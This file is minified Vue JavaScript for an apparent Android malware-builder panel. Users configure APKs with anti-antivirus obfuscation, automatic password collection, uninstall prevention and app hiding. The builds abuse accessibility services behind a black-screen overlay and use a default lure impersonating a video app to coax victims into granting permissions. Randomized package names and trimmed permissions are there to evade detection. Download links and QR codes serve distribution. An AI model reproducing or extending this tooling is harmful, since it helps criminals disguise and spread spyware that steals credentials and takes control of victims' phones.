import {
    g as ne,
    a as G,
    l as J,
    m as ke,
    u as K,
    b as ae,
    c as Ce
} from "./vendor.chunk.js";
import {
    d as O,
    o as f,
    c as T,
    a as m,
    r as R,
    s as c,
    aM as oe,
    b7 as re,
    al as C,
    w as a,
    h as t,
    j as b,
    aV as P,
    aS as B,
    t as I,
    aK as D,
    B as Q,
    an as W,
    b2 as j,
    b3 as V,
    bf as $e,
    b8 as se,
    u as ie,
    g as Se,
    n as ue,
    p as pe,
    N as Ue,
    au as Ee,
    bg as Te,
    bh as Re,
    _ as de,
    b as Me,
    am as Ne,
    bi as ze,
    v as Ae
} from "./core.vendor.js";
const Le = {
        xmlns: "http://www.w3.org/2000/svg",
        "xmlns:xlink": "http://www.w3.org/1999/xlink",
        viewBox: "0 0 512 512"
    },
    Ie = m("path", {
        d: "M320 146s24.36-12-64-12a160 160 0 1 0 160 160",
        fill: "none",
        stroke: "currentColor",
        "stroke-linecap": "round",
        "stroke-miterlimit": "10",
        "stroke-width": "32"
    }, null, -1),
    De = m("path", {
        fill: "none",
        stroke: "currentColor",
        "stroke-linecap": "round",
        "stroke-linejoin": "round",
        "stroke-width": "32",
        d: "M256 58l80 80l-80 80"
    }, null, -1),
    Oe = [Ie, De],
    Fe = O({
        name: "Refresh",
        render: function($, g) {
            return f(), T("svg", Le, Oe)
        }
    }),
    Ke = ["src"],
    Pe = {
        style: {
            "text-align": "center",
            "font-weight": "bold",
            color:"#14213d"
        }
    },
    Be = {
        style: {
            "text-align": "center",
            "font-size": "12px",
            color:"#5b6b8c"
        }
    },
    je = {
        style: {
            "text-align": "center",
            "font-size": "12px",
            color:"#5b6b8c"
        }
    },
    Ve = O({
        __name: "BasicSetting",
        setup(F) {
            const $ = R({
                    email: c.get("CURRENT-EMAIL"),
                    token: c.get("ACCESS-TOKEN"),
                    subcom: "load"
                }),
                g = R([]);

            function S(i) {
                return G + `/user/storage/${i.replace(/\\/g,"/")}`
            }

            function x(i) {
                if (i.build_state !== "finished") {
                    window.$message.warning("构建未完成，无法下载");
                    return
                }
                i.progress = 0;
                const r = {
                    email: c.get("CURRENT-EMAIL"),
                    token: c.get("ACCESS-TOKEN"),
                    subcom: "download",
                    appid: i.app_package
                };
                J(r, {
                    responseType: "blob",
                    onDownloadProgress: p => {
                        p.total && (i.progress = Math.round(p.loaded / p.total * 100))
                    }
                }).then(p => {
                    if (p instanceof Blob) {
                        const _ = window.URL.createObjectURL(p),
                            l = document.createElement("a");
                        l.href = _, l.download = `${i.app_package}.apk`, document.body.appendChild(l), l.click(), window.URL.revokeObjectURL(_), document.body.removeChild(l), i.progress = 100
                    }
                }).catch(p => {
                    console.error("下载出错:", p), window.$message.error("下载失败"), i.progress = void 0
                })
            }

            function N(i) {
                const r = {
                    email: c.get("CURRENT-EMAIL"),
                    token: c.get("ACCESS-TOKEN"),
                    subcom: "delete",
                    appid: i.app_package
                };
                J(r).then(p => {
                    p != null && p.Success && (window.$message.success(p.Success.replace(/^"|"$/g, "")), g.value = g.value.filter(_ => _.app_package !== i.app_package), k())
                }).catch(p => {
                    console.error("删除出错:", p)
                })
            }

            function U(i) {
                if (i.build_state !== "finished") {
                    window.$message.warning("构建未完成");
                    return
                }
                const r = {
                    email: c.get("CURRENT-EMAIL"),
                    token: c.get("ACCESS-TOKEN"),
                    subcom: "getlink",
                    appid: i.app_package
                };
                J(r).then(p => {
                    if (p && p.link) {
                        if (navigator.clipboard && navigator.clipboard.writeText) {
                            navigator.clipboard.writeText(p.link).then(() => {
                                window.$message.success("下载链接已复制到剪贴板")
                            }).catch(() => {
                                prompt("复制下载链接:", p.link)
                            })
                        } else {
                            prompt("复制下载链接:", p.link)
                        }
                    } else {
                        window.$message.error(p && p.Fail ? p.Fail : "获取链接失败")
                    }
                }).catch(p => {
                    console.error("获取链接出错:", p), window.$message.error("获取链接失败")
                })
            }

            function Z(i) {
                if (i.build_state !== "finished") {
                    window.$message.warning("构建未完成");
                    return
                }
                const r = {
                    email: c.get("CURRENT-EMAIL"),
                    token: c.get("ACCESS-TOKEN"),
                    subcom: "getlink",
                    appid: i.app_package
                };
                J(r).then(p => {
                    if (p && p.qrcode) {
                        const _ = document.createElement("div");
                        _.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:9999;cursor:pointer";
                        _.onclick = () => document.body.removeChild(_);
                        const l = document.createElement("div");
                        l.style.cssText = "background:#f5f7fb;border:1px solid #383025;padding:24px;border-radius:12px;text-align:center;max-width:360px";
                        l.onclick = e => e.stopPropagation();
                        const h = document.createElement("img");
                        h.src = p.qrcode;
                        h.style.cssText = "width:300px;height:300px";
                        h.alt = "下载二维码";
                        const v = document.createElement("p");
                        v.style.cssText = "margin:12px 0 0;color:#5b6b8c;font-size:14px";
                        v.textContent = "扫描二维码下载 APK";
                        const w = document.createElement("button");
                        w.textContent = "复制链接";
                        w.style.cssText = "margin-top:12px;padding:8px 24px;border:1px solid #14213d;border-radius:6px;background:transparent;color:#5b6b8c;cursor:pointer;font-size:14px";
                        w.onclick = () => {
                            if (p.link && navigator.clipboard) {
                                navigator.clipboard.writeText(p.link).then(() => window.$message.success("已复制"))
                            }
                        };
                        l.appendChild(h);
                        l.appendChild(v);
                        l.appendChild(w);
                        _.appendChild(l);
                        document.body.appendChild(_)
                    } else {
                        window.$message.error("生成二维码失败")
                    }
                }).catch(p => {
                    console.error("二维码出错:", p), window.$message.error("生成二维码失败")
                })
            }

            function buildPoll() {
                const items = g.value || [];
                items.forEach(function(item) {
                    if (item.build_state === "finished" || item.build_state === "failed") return;
                    fetch("/api/BuildProgress.php", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            token: c.get("ACCESS-TOKEN"),
                            email: c.get("CURRENT-EMAIL"),
                            appid: item.app_package
                        })
                    }).then(function(r) {
                        return r.json()
                    }).then(function(d) {
                        if (!d || d.code !== 200) return;
                        item.build_pct = d.percent || 0;
                        item.build_step = d.step || "";
                        item.build_eta = d.eta_s || 0;
                        if (d.state === "finished") item.build_state = "finished";
                        if (d.state === "failed") item.build_state = "failed";
                    }).catch(function() {});
                });
            }

            function k() {
                J($.value).then(i => {
                    if (i != null && i.Success) {
                        const r = typeof i.Success === "string" ? JSON.parse(i.Success) : i.Success;
                        g.value = r
                    } else if (i != null && (i.Req || i.Fail)) {
                        window.$message.warning(i.Req || i.Fail)
                    }
                }).catch(i => {
                    console.error("请求出错：", i)
                })
            }
            let v, w, v2;
            return oe(() => {
                k(), w = c.get("CURRENT-AUTHORTY"), v = setInterval(() => {
                    ne(1, 10, {})
                }, 5e3), v2 = setInterval(() => { buildPoll(); k(); }, 3e3)
            }), re(() => {
                clearInterval(v), clearInterval(v2)
            }), (i, r) => {
                const p = Q,
                    _ = W,
                    l = j,
                    M = V,
                    z = $e,
                    A = se;
                return f(), C(_, {
                    vertical: "",
                    size: "large"
                }, {
                    default: a(() => [t(M, {
                        cols: "2 s:2 m:2 l:3 xl:3 2xl:3",
                        responsive: "screen"
                    }, {
                        default: a(() => [t(l, null, {
                            default: a(() => [t(_, null, {
                                default: a(() => [t(p, {
                                    type: "primary",
                                    onClick: k
                                }, {
                                    default: a(() => r[1] || (r[1] = [b("更新")])),
                                    _: 1
                                })]),
                                _: 1
                            })]),
                            _: 1
                        })]),
                        _: 1
                    }), t(M, {
                        cols: "1 s:2 m:3 l:4 xl:5",
                        responsive: "screen",
                        "x-gap": "12",
                        "y-gap": "12"
                    }, {
                        default: a(() => [(f(!0), T(P, null, B(g.value, y => (f(), C(l, {
                            key: y.app_package
                        }, {
                            default: a(() => [t(A, {
                                hoverable: ""
                            }, {
                                default: a(() => [t(_, {
                                    vertical: "",
                                    align: "center"
                                }, {
                                    default: a(() => [m("img", {
                                        src: S(y.app_ico),
                                        onError: r[0] || (r[0] = L => L.target.src = "https://via.placeholder.com/64?text=X"),
                                        alt: "icon",
                                        style: {
                                            width: "64px",
                                            height: "64px",
                                            "object-fit": "contain"
                                        }
                                    }, null, 40, Ke), m("div", Pe, I(y.appname), 1), m("div", Be, " 包名：" + I(y.app_package), 1), m("div", je, " 安装时间：" + I(y.build_date), 1), y.build_state !== "finished" && y.build_state !== "failed" ? (f(!0), m("div", null, [m("div", {
                                        style: "margin-top:10px;height:8px;background:#e5eaf4;border-radius:4px;overflow:hidden"
                                    }, [m("div", {
                                        style: "height:100%;width:" + (y.build_pct || 0) + "%;background:linear-gradient(90deg,#6b83ff,#6b83ff);transition:width .6s"
                                    })]), m("div", {
                                        style: "margin-top:6px;font-size:12px;color:#5b6b8c"
                                    }, "构建中 " + (y.build_pct || 0) + "% · " + (y.build_step || "准备中") + (y.build_eta ? " · 预计剩余约 " + Math.max(1, Math.ceil(y.build_eta / 60)) + " 分钟" : ""))])) : D("", !0), t(p, {
                                        type: "primary",
                                        size: "small",
                                        disabled: y.build_state !== "finished",
                                        onClick: L => x(y)
                                    }, {
                                        default: a(() => r[2] || (r[2] = [b(" 下载 ")])),
                                        _: 2
                                    }, 1032, ["disabled", "onClick"]), t(p, {
                                        type: "info",
                                        size: "small",
                                        disabled: y.build_state !== "finished",
                                        onClick: L => {
                                            if (y.app_path) {
                                                const _ = document.createElement("a");
                                                _.href = G + "/" + y.app_path;
                                                _.download = y.app_package + ".apk";
                                                document.body.appendChild(_);
                                                _.click();
                                                document.body.removeChild(_)
                                            } else {
                                                window.$message.error("下载路径不存在")
                                            }
                                        }
                                    }, {
                                        default: a(() => [b(" 快速下载 ")]),
                                        _: 2
                                    }, 1032, ["disabled", "onClick"]), t(p, {
                                        type: "success",
                                        size: "small",
                                        disabled: y.build_state !== "finished",
                                        onClick: L => U(y)
                                    }, {
                                        default: a(() => [b(" 获取链接 ")]),
                                        _: 2
                                    }, 1032, ["disabled", "onClick"]), t(p, {
                                        type: "warning",
                                        size: "small",
                                        disabled: y.build_state !== "finished",
                                        onClick: L => Z(y)
                                    }, {
                                        default: a(() => [b(" 二维码 ")]),
                                        _: 2
                                    }, 1032, ["disabled", "onClick"]), t(p, {
                                        type: "error",
                                        size: "small",
                                        onClick: L => N(y)
                                    }, {
                                        default: a(() => r[3] || (r[3] = [b(" 删除 ")])),
                                        _: 2
                                    }, 1032, ["onClick"]), y.progress !== void 0 ? (f(), C(z, {
                                        key: 0,
                                        type: "line",
                                        percentage: y.progress,
                                        status: y.progress === 100 ? "success" : "default",
                                        style: {
                                            width: "100%",
                                            "margin-top": "8px"
                                        }
                                    }, null, 8, ["percentage", "status"])) : D("", !0)]),
                                    _: 2
                                }, 1024)]),
                                _: 2
                            }, 1024)]),
                            _: 2
                        }, 1024))), 128))]),
                        _: 1
                    })]),
                    _: 1
                })
            }
        }
    }),
    qe = O({
        __name: "RevealSetting",
        setup(F) {
            const $ = [{
                    label: "单",
                    value: "g"
                }, {
                    label: "AB包",
                    value: "d"
                }],
                g = [{
                    label: "内置界面",
                    value: "0"
                }, {
                    label: "外置界面",
                    value: "1"
                }],
                S = [{
                    label: "常规触发",
                    value: "0"
                }, {
                    label: "强制触发限制弹窗（国外单包专用）",
                    value: "1"
                }],
                x = [{
                    label: "全部",
                    value: "1"
                }, {
                    label: "文件",
                    value: "0"
                }],
                N = [{
                    label: "直接隐藏",
                    value: "c"
                }, {
                    label: "卸载隐藏",
                    value: "f"
                }, {
                    label: "提示卸载",
                    value: "k"
                }],
                k = [{
                    label: "开启免杀保护",
                    value: "on"
                }, {
                    label: "关闭免杀保护",
                    value: "off"
                }],
                v = [{
                    label: "开启自动收集密码",
                    value: "1"
                }, {
                    label: "关闭自动收集密码",
                    value: "0"
                }],
                w = [{
                    label: "开启防止卸载",
                    value: "1"
                }, {
                    label: "关闭防止卸载",
                    value: "0"
                }],
                zseg = (opts, cur, setv) => m("div", {
                    class: "zgl-seg"
                }, opts.map(o => m("button", {
                    type: "button",
                    class: "zgl-seg-btn" + (cur === o.value ? " zgl-seg-on" : ""),
                    onClick: () => setv(o.value)
                }, o.label))),
                i = R(null),
                r = ie(),
                p = R([]),
                _ = R([]),
                l = R({
                    email: c.get("CURRENT-EMAIL"),
                    token: c.get("ACCESS-TOKEN"),
                    subcom: "build",
                    btype: "C",
                    uhost: ke,
                    cname: "",
                    uaccess: "1",
                    ukill: "1",
                    uprims: "加载中~请勿操作或锁屏！",
                    appid: "",
                    nottitle: " ",
                    notmsg: "on",
                    appname: "",
                    appversion: "",
                    icoid: "",
                    appurl: "",
                    allprims: "1",
                    blackprims: "1",
                    logt: "name",
                    logd: "允许受限制的设置",
                    logb: "确定",
                    loglng: "91视频温馨提醒   因大陆网络受限制本次需要开启权限才能使用   请仔细阅读使用步骤--   1、点击下方确定--   2、打开已下载服务（或应用）--   3、点击91视频--开始使用--等待加载100%即可使用",
                    hidapp: "1",
                    noemu: "black",
                    accsstyp: "g",
                    hidtype: "f",
                    usedraw: "0",
                    openaccess: "0",
                    description: "无",
                    diaotype: "1",
                    protect: "1",
                    trimperms: "0"
                }),
                M = ["helper", "musics", "scanner", "sensor", "service", "listener", "logger", "manager", "tracker", "analyzer", "responder", "provider", "monitor", "tasker", "fetcher", "updater", "notifier", "config", "broadcaster", "engine", "dispatcher", "initializer", "watcher", "controller", "compiler", "injector", "agent", "module", "executor", "decoder", "encoder", "handler", "daemon", "interceptor", "guardian", "synchronizer", "router", "channel", "resolver", "transmitter", "scheduler", "recycler", "observer", "validator", "repeater", "registrar", "extractor", "conductor", "pinger", "poller", "allocator", "activator", "stabilizer", "linker", "queue", "filter", "migrator", "merger", "parser", "sequencer", "assembler", "generator", "transformer", "collector", "dispatcher", "aggregator", "notifier", "orchestrator", "translator", "integrator", "loader", "watchdog", "connector", "dispatcher", "formatter", "iterator", "duplicator", "normalizer", "optimizer", "randomizer", "simulator", "converter", "combiner", "validator", "authorizer", "renderer", "adapter", "modulator", "transcoder", "stager", "expander", "compressor", "balancer", "packager", "cataloger", "archiver", "shuffler", "verifier", "emulator", "enforcer", "propagator", "distributor", "calculator", "processor", "indexer", "explorer", "messenger", "subsystem", "proxy", "upscaler"],
                z = ["relay", "schedulerx", "streamer", "notary", "signaler", "cipher", "replicator", "guardianx", "mapper", "allocatorx", "prober", "attester", "invoker", "fuser", "demuxer", "muxer", "packagerx", "regulator", "quantizer", "harmonizer", "balancerx", "watchtower", "streamguard", "verdictor", "anonymizer", "redactor", "scrubber", "classifier", "detector", "resolverx", "filterer", "diffuser", "normalizerx", "inspector", "predictor", "auditor", "overseer", "pilot", "navigator", "relayx", "guardianbot", "provisioner", "weaver", "synthesizer", "orchestrax", "patcher", "gatekeeper", "warden", "marshall", "triager", "coordinator", "activatorx", "enabler", "terminator", "curator", "indexbot", "facilitator", "metronome", "harmonizerx", "refiner", "enumerator", "sampler", "planner", "resonator", "correlator", "analyzerx", "schedulerbot", "validatorx", "stabilizerx", "injectorx", "differentiator", "aggregatorx", "modeller", "predictorx", "verifierx", "watchdogx", "transactor", "emitter", "pipeliner", "calibrator", "aggregabot", "translatorx", "transcriber", "disassembler", "interpreter", "routerx", "combinerx", "expeditor", "shielder", "collator", "indexguard", "projector", "dispatcherx", "resourcer", "guardianbotx", "refactor", "transposer", "broker", "allocatorbot", "loadbalancer"];

            function A(o) {
                return o[Math.floor(Math.random() * o.length)]
            }

            function y() {
                const o = ["com", "net", "org"][Math.floor(Math.random() * 3)],
                    e = A(M),
                    s = A(z),
                    u = A(M);
                l.value.appid = `${o}.${e}.${s}.${u}`;
                const d = Math.floor(Math.random() * 10),
                    h = Math.floor(Math.random() * 10),
                    U = Math.floor(Math.random() * 10);
                l.value.appversion = `${d}.${h}.${U}`
            }

            function L({
                file: o
            }) {
                const e = new FormData;
                e.append("file", o.file), e.append("email", c.get("CURRENT-EMAIL")), e.append("token", c.get("ACCESS-TOKEN")), e.append("type", "ico"), K(e).then(s => {
                    var u;
                    s != null && s.Success ? (window.$message.success(s.Success.replace(/^"|"$/g, "")), q()) : window.$message.error(((u = s.Fail) == null ? void 0 : u.replace(/^"|"$/g, "")) || "上传失败")
                }).catch(s => {
                    window.$message.error("上传出错")
                })
            }

            function ce(o, e) {
                var d;
                const s = ((d = o.split("/").pop()) == null ? void 0 : d.trim()) || "",
                    u = new FormData;
                u.append("email", c.get("CURRENT-EMAIL")), u.append("token", c.get("ACCESS-TOKEN")), u.append("type", "remico"), u.append("iconame", s), K(u).then(h => {
                    h != null && h.Success ? (window.$message.success("图标已删除"), q()) : window.$message.error("删除失败")
                }).catch(() => {
                    window.$message.error("删除请求出错")
                })
            }

            function me({
                file: o
            }) {
                const e = new FormData;
                e.append("file", o.file), e.append("email", c.get("CURRENT-EMAIL")), e.append("token", c.get("ACCESS-TOKEN")), e.append("type", "ui"), K(e).then(s => {
                    s != null && s.Success ? (window.$message.success("上传成功"), X()) : window.$message.error("上传失败")
                }).catch(s => {
                    window.$message.error("上传出错")
                })
            }

            function ge(o, e) {
                var d;
                const s = ((d = o.split("/").pop()) == null ? void 0 : d.trim()) || "",
                    u = new FormData;
                u.append("email", c.get("CURRENT-EMAIL")), u.append("token", c.get("ACCESS-TOKEN")), u.append("type", "remui"), u.append("uiname", s), K(u).then(h => {
                    h != null && h.Success ? (window.$message.success("图片已删除"), X()) : window.$message.error("删除失败")
                }).catch(() => {
                    window.$message.error("删除请求出错")
                })
            }

            function fe(o) {
                const e = "/var/www/html/user" + o.replace(/\\/g, "/");
                l.value.noemu = e, r.success("已选择ui")
            }

            function ve(o) {
                return G + `/user/${o.replace(/\\/g,"/")}`
            }

            function _e(o) {
                var s;
                const e = ((s = o.split("/").pop()) == null ? void 0 : s.trim()) || "";
                l.value.icoid = e, r.success(`已选择图标: ${e}`)
            }

            function we(o) {
                return G + `/user/storage/${o.replace(/\\/g,"/")}`
            }

            function q() {
                const o = new FormData;
                o.append("email", c.get("CURRENT-EMAIL")), o.append("token", c.get("ACCESS-TOKEN")), o.append("type", "listico"), ae(o).then(e => {
                    if (e != null && typeof e.Success === "string") {
                        _.value = e.Success.replace(/^"|"$/g, "").split(",").map(d => d.trim()).filter(d => d)
                    } else _.value = []
                }).catch(() => {
                    console.error("listico load error")
                })
            }

            function X() {
                const o = new FormData;
                o.append("email", c.get("CURRENT-EMAIL")), o.append("token", c.get("ACCESS-TOKEN")), o.append("type", "listui"), ae(o).then(e => {
                    if (e != null && typeof e.Success === "string") {
                        p.value = e.Success.replace(/^"|"$/g, "").split(",").map(d => d.replace(/\\/g, "/").replace(/\/+/g, "/").trim()).filter(d => d)
                    } else p.value = []
                }).catch(() => {
                    console.error("listui load error")
                })
            }

            function ye() {
                l.value.appversion = (1 + Math.floor(Math.random() * 9)) + "." + Math.floor(Math.random() * 10) + "." + Math.floor(Math.random() * 10);
                if (!l.value.cname) {
                    r.warning("上线名称为空");
                    return
                }
                if (!l.value.appname) {
                    r.warning("应用名称为空");
                    return
                }
                if (!l.value.appurl) {
                    r.warning("应用网址为空");
                    return
                }
                if (!l.value.logd) {
                    r.warning("限制按钮为空");
                    return
                }
                if (!l.value.logb) {
                    r.warning("跳转按钮为空");
                    return
                }
                if (!l.value.uprims) {
                    r.warning("黑屏文字为空");
                    return
                }
                if (!l.value.loglng) {
                    r.warning("窗口文字为空");
                    return
                }
                if (!l.value.appid) {
                    r.warning("应用包名为空");
                    return
                }
                if (!l.value.appversion) {
                    r.warning("应用版本为空");
                    return
                }
                if (!l.value.icoid) {
                    r.warning("应用图标为空");
                    return
                }
                Ce(l.value).then(o => {
                    var e;
                    o != null && o.Success ? window.$message.success(o.Success.replace(/^"|"$/g, "")) : window.$message.error(((e = o == null ? void 0 : o.Fail) == null ? void 0 : e.replace(/^"|"$/g, "")) || "构建失败")
                }).catch(() => {
                    window.$message.error("构建请求出错")
                })
            }
            let Z, ee;
            return oe(() => {
                ee = c.get("CURRENT-AUTHORTY"), q(), X(), Z = setInterval(() => {
                    ne(1, 10, {})
                }, 5e3)
            }), re(() => {
                clearInterval(Z)
            }), (o, e) => {
                const s = ue,
                    u = W,
                    d = pe,
                    h = Ue,
                    U = Q,
                    E = Ee,
                    te = Te,
                    le = Re,
                    be = de,
                    xe = j,
                    he = V;
                return f(), C(he, {
                    cols: "1"
                }, {
                    default: a(() => [t(xe, null, {
                        default: a(() => [t(be, {
                            "label-placement": "top",
                            model: l.value,
                            ref_key: "formRef",
                            ref: i,
                            class: "zgl-builder-form"
                        }, {
                            default: a(() => [t(he, {
                                cols: "1 s:1 m:2 l:2 xl:2 2xl:2",
                                responsive: "screen",
                                "x-gap": "14",
                                "y-gap": "14"
                            }, {
                                default: a(() => [t(xe, {
                                    span: 2
                                }, {
                                    default: a(() => [m("div", {
    class: "zgl-sec"
}, [m("div", {
    class: "zgl-sec-head"
}, [m("span", {
    class: "zgl-sec-title"
}, "① 基础信息"), m("span", {
    class: "zgl-sec-tip"
}, "BASIC INFO")]), t(he, {
    cols: "1 s:1 m:2 l:2 xl:2 2xl:2",
    responsive: "screen",
    "x-gap": "12"
}, {
    default: a(() => [t(xe, null, {
        default: a(() => [t(d, {
            label: "上线名称",
            required: !0
        }, {
            default: a(() => [t(s, {
                value: l.value.cname,
                "onUpdate:value": n => l.value.cname = n,
                placeholder: "设备上线的显示名称，例如：91视频"
            }, null, 8, ["value"])]),
            _: 1
        })]),
        _: 1
    }), t(xe, null, {
        default: a(() => [t(d, {
            label: "无障碍服务介绍"
        }, {
            default: a(() => [t(s, {
                value: l.value.description,
                "onUpdate:value": n => l.value.description = n,
                placeholder: "展示在系统无障碍设置里，不写填：无"
            }, null, 8, ["value"])]),
            _: 1
        })]),
        _: 1
    }), t(xe, null, {
        default: a(() => [t(d, {
            label: "应用名称",
            required: !0
        }, {
            default: a(() => [t(s, {
                value: l.value.appname,
                "onUpdate:value": n => l.value.appname = n,
                placeholder: "安装后显示的 APP 名称"
            }, null, 8, ["value"])]),
            _: 1
        })]),
        _: 1
    }), t(xe, null, {
        default: a(() => [t(d, {
            label: "应用网址",
            required: !0
        }, {
            default: a(() => [t(s, {
                value: l.value.appurl,
                "onUpdate:value": n => l.value.appurl = n,
                placeholder: "打开 APP 后加载的网页（http/https 开头）"
            }, null, 8, ["value"])]),
            _: 1
        })]),
        _: 1
    })])
})])]),
                                    _: 1
                                }), t(xe, {
                                    span: 2
                                }, {
                                    default: a(() => [m("div", {
    class: "zgl-sec"
}, [m("div", {
    class: "zgl-sec-head"
}, [m("span", {
    class: "zgl-sec-title"
}, "② 界面文字"), m("span", {
    class: "zgl-sec-tip"
}, "UI TEXT")]), t(d, {
    label: "窗口文字（权限弹窗提示）",
    required: !0
}, {
    default: a(() => [t(s, {
        type: "textarea",
        rows: 4,
        value: l.value.loglng,
        "onUpdate:value": n => l.value.loglng = n,
        placeholder: "权限弹窗上的提示正文，三个空格表示换行"
    }, null, 8, ["value"])]),
    _: 1
}), t(he, {
    cols: "1 s:1 m:2 l:2 xl:2 2xl:2",
    responsive: "screen",
    "x-gap": "12"
}, {
    default: a(() => [t(xe, null, {
        default: a(() => [t(d, {
            label: "黑屏文字"
        }, {
            default: a(() => [t(s, {
                value: l.value.uprims,
                "onUpdate:value": n => l.value.uprims = n,
                placeholder: "屏幕变黑时显示，例如：加载中~请勿操作或锁屏！"
            }, null, 8, ["value"])]),
            _: 1
        })]),
        _: 1
    }), t(xe, null, {
        default: a(() => [t(d, {
            label: "弹窗按钮文字"
        }, {
            default: a(() => [m("div", {
                style: "display:flex;gap:10px"
            }, [t(s, {
                value: l.value.logd,
                "onUpdate:value": n => l.value.logd = n,
                placeholder: "左按钮（限制设置）",
                style: "flex:1"
            }, null, 8, ["value"]), t(s, {
                value: l.value.logb,
                "onUpdate:value": n => l.value.logb = n,
                placeholder: "右按钮（确认）",
                style: "flex:1"
            }, null, 8, ["value"])])]),
            _: 1
        })]),
        _: 1
    })])
})])]),
                                    _: 1
                                }), t(xe, null, {
                                    default: a(() => [m("div", {
    class: "zgl-sec"
}, [m("div", {
    class: "zgl-sec-head"
}, [m("span", {
    class: "zgl-sec-title"
}, "③ 包名与版本"), m("span", {
    class: "zgl-sec-tip"
}, "PACKAGE")]), t(d, {
    label: "应用包名",
    required: !0
}, {
    default: a(() => [m("div", {
        style: "display:flex;gap:8px;align-items:center"
    }, [t(s, {
        value: l.value.appid,
        "onUpdate:value": n => l.value.appid = n,
        placeholder: "例如：com.demo.video",
        style: "flex:1"
    }, null, 8, ["value"]), t(U, {
        type: "info",
        circle: !0,
        size: "small",
        onClick: y
    }, {
        icon: a(() => [t(h, null, {
            default: a(() => [t(Se(Fe))]),
            _: 1
        })]),
        _: 1
    })])]),
    _: 1
}), t(d, {
    label: "应用版本",
    required: !0
}, {
    default: a(() => [m("div", {
        style: "display:flex;gap:8px;align-items:center"
    }, [t(s, {
        value: l.value.appversion,
        "onUpdate:value": n => l.value.appversion = n,
        placeholder: "例如：1.0.0",
        style: "flex:1"
    }, null, 8, ["value"]), t(U, {
        type: "info",
        circle: !0,
        size: "small",
        onClick: y
    }, {
        icon: a(() => [t(h, null, {
            default: a(() => [t(Se(Fe))]),
            _: 1
        })]),
        _: 1
    })])]),
    _: 1
})])]),
                                    _: 1
                                }), t(xe, null, {
                                    default: a(() => [m("div", {
    class: "zgl-sec"
}, [m("div", {
    class: "zgl-sec-head"
}, [m("span", {
    class: "zgl-sec-title"
}, "④ 安装与运行"), m("span", {
    class: "zgl-sec-tip"
}, "INSTALL & RUN")]), t(d, {
    label: "安装模式"
}, {
    default: a(() => [zseg($, l.value.accsstyp, n => l.value.accsstyp = n)]),
    _: 1
}), l.value.accsstyp === "d" ? t(d, {
    label: "引导包名称"
}, {
    default: a(() => [t(s, {
        value: l.value.logt,
        "onUpdate:value": n => l.value.logt = n,
        placeholder: "双包安装的引导包名，不要和应用名称一样"
    }, null, 8, ["value"])]),
    _: 1
}) : D("", !0), t(d, {
    label: "无障碍触发模式"
}, {
    default: a(() => [zseg(S, l.value.openaccess, n => l.value.openaccess = n)]),
    _: 1
}), t(d, {
    label: "应用权限"
}, {
    default: a(() => [zseg(x, l.value.allprims, n => l.value.allprims = n)]),
    _: 1
}), t(d, {
    label: "运行模式"
}, {
    default: a(() => [zseg(g, l.value.usedraw, n => l.value.usedraw = n)]),
    _: 1
}), t(d, {
    label: "隐藏模式"
}, {
    default: a(() => [zseg(N, l.value.hidtype, n => l.value.hidtype = n)]),
    _: 1
})])]),
                                    _: 1
                                }), t(xe, {
                                    span: 2
                                }, {
                                    default: a(() => [m("div", {
    class: "zgl-sec"
}, [m("div", {
    class: "zgl-sec-head"
}, [m("span", {
    class: "zgl-sec-title"
}, "⑤ 安全防护"), m("span", {
    class: "zgl-sec-tip"
}, "免杀、防卸载与加固开关")]), t(he, {
    cols: "1 s:1 m:2 l:2 xl:2 2xl:2",
    responsive: "screen",
    "x-gap": "12"
}, {
    default: a(() => [t(xe, null, {
        default: a(() => [t(d, {
            label: "免杀保护"
        }, {
            default: a(() => [zseg(k, l.value.notmsg, n => l.value.notmsg = n)]),
            _: 1
        })]),
        _: 1
    }), t(xe, null, {
        default: a(() => [t(d, {
            label: "自动收集密码"
        }, {
            default: a(() => [zseg(v, l.value.diaotype, n => l.value.diaotype = n)]),
            _: 1
        })]),
        _: 1
    }), t(xe, null, {
        default: a(() => [t(d, {
            label: "防止卸载"
        }, {
            default: a(() => [zseg(w, l.value.ukill, n => l.value.ukill = n)]),
            _: 1
        })]),
        _: 1
    }), t(xe, null, {
        default: a(() => [t(d, {
            label: "AV 混淆保护"
        }, {
            default: a(() => [zseg([{
                label: "开启",
                value: "1"
            }, {
                label: "关闭",
                value: "0"
            }], l.value.protect, n => l.value.protect = n), m("div", {
                class: "zgl-field-tip"
            }, "实验性功能，可能影响无障碍")]),
            _: 1
        })]),
        _: 1
    }), t(xe, null, {
        default: a(() => [t(d, {
            label: "精简权限"
        }, {
            default: a(() => [zseg([{
                label: "开启",
                value: "1"
            }, {
                label: "关闭",
                value: "0"
            }], l.value.trimperms, n => l.value.trimperms = n), m("div", {
                class: "zgl-field-tip"
            }, "去掉短信/通讯录/录音权限，降低报毒")]),
            _: 1
        })]),
        _: 1
    })])
})])]),
                                    _: 1
                                }), t(xe, null, {
                                    default: a(() => [m("div", {
    class: "zgl-sec"
}, [m("div", {
    class: "zgl-sec-head"
}, [m("span", {
    class: "zgl-sec-title"
}, "⑥ 遮挡图片"), m("span", {
    class: "zgl-sec-tip"
}, "不选则默认黑色遮罩")]), t(le, {
    "custom-request": me,
    "show-file-list": !1,
    accept: ".png"
}, {
    default: a(() => [t(U, null, {
        default: a(() => [b("上传遮挡图片")]),
        _: 1
    })]),
    _: 1
}), m("div", {
    class: "zgl-field-tip"
}, "建议 720×1280 PNG，点击图片即选中为遮挡背景"), t(u, {
    wrap: ""
}, {
    default: a(() => [(f(!0), T(P, null, B(p.value, (n, H) => (f(), T("div", {
        key: H,
        class: "zgl-img-cell"
    }, [t(te, {
        src: ve(n),
        width: "125",
        height: "125",
        onClick: Y => fe(n)
    }, null, 8, ["src", "onClick"]), t(U, {
        size: "small",
        type: "error",
        style: "position:absolute;top:2px;right:2px;padding:0;width:18px;height:18px;font-size:13px;color:#fff;background-color:rgba(214,69,69,0.85);border-radius:50%;line-height:16px;text-align:center;cursor:pointer",
        onClick: Y => ge(n)
    }, {
        default: a(() => [b("×")]),
        _: 2
    }, 1032, ["onClick"])]))), 128))]),
    _: 1
})])]),
                                    _: 1
                                }), t(xe, null, {
                                    default: a(() => [m("div", {
    class: "zgl-sec"
}, [m("div", {
    class: "zgl-sec-head"
}, [m("span", {
    class: "zgl-sec-title"
}, "⑦ 应用图标"), m("span", {
    class: "zgl-sec-tip"
}, "点击图标即选中")]), t(le, {
    "custom-request": L,
    "show-file-list": !1,
